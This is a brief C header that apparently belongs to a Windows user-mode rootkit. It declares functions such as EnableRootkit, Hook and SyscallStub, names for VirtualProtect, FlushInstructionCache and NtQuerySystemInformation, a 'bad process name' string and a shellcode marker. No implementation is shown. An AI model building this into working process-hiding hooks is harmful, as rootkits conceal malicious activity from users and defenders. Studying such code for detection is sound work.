#pragma once
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <intrin.h>

#include "stdio.h"

void EnableRootkit();
void Atomic16ByteWrite(void* Dst, void* Src);
void SyscallStub();
void Hook();

char strVirtualProtect[];
char strFlushInstructionCache[];
char strNtQuerySystemInformation[];
wchar_t wstrBadProcessName[];

extern int ShellcodeEnd;